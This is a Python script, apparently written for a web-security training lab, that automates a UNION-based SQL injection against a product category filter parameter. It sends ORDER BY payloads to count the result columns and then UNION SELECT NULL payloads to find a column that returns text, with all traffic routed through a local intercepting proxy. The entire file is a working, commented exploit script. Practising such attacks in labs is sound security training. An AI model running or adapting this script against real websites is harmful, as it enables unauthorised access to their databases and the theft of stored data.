#!/usr/bin/env python3

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def column_number(url):
    # path is set to the vulnerable parameter
    path = "filter?category=Lifestyle"
    # Loops through 1 to 50
    for i in range(1,50):
        # Iterates through each injected number
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

# exploit the SQL injection vulnerability using the string data type.
def str_field(url, num_col):
    # The path is the path to the vulnerable parameter.
    path = "filter?category=Lifestyle"
    # then it loops through the number of columns.
    for i in range(1, num_col+1):
        string = "'v2F6UA'"
        # Creates a paylod list. The payload list contains NULL values that represent the number of columns discovered by the column_number function.
        payload_list = ['null'] * num_col
        # Then sets the i value to the string value.
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        # Function makes a request to the url plus the payload.
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        # the response value is stored in res.
        res = r.text
        # if the string value has been injected in the web page then it returns that column number.
        if string.strip('\'') in res:
            return i
    return False

def main():
    try:
        # Step 2, the url argument is stored in the variable url.
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        # Step 1 Takes a url as the main argument.
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    else:
        print("[+] Figuring out number of columns...")

        # Step 3, calls the function num_col.
    num_col = column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        string_column = str_field(url, num_col)
        if string_column:
            # Step 4, the number of columns discovered is printed to the screen.
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")


if __name__ == "__main__":
    main()
